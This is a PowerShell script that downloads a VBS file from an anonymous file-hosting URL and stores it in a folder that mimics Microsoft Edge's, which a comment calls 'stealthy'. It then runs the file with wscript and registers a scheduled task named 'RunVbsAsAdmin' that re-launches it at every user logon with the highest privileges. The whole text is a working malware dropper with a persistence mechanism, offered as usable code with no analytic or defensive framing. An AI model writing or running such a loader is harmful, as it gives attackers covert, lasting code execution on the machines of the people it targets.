# Define URL of the VBS file
$url = "https://files.catbox.moe/eqlsi1.vbs"

# Define a stealthy folder to store the file
$destinationFolder = Join-Path $env:APPDATA "Microsoft\Edge"
$destinationPath = Join-Path $destinationFolder "eqlsi1.vbs"

# Create the folder if it doesn't exist
if (-not (Test-Path $destinationFolder)) {
    New-Item -ItemType Directory -Path $destinationFolder | Out-Null
}

# Download the VBS file to the new location
Invoke-WebRequest -Uri $url -OutFile $destinationPath

# Optionally run the VBS immediately (for testing)
Start-Process -FilePath "wscript.exe" -ArgumentList "`"$destinationPath`"" -NoNewWindow

# === Scheduled Task Setup ===

# Create the task action
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$destinationPath`""

# Set trigger on user logon
$trigger = New-ScheduledTaskTrigger -AtLogOn

# Set principal to current user with highest privileges
$principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest

# Task settings
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

# Register the task
Register-ScheduledTask -TaskName "RunVbsAsAdmin" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
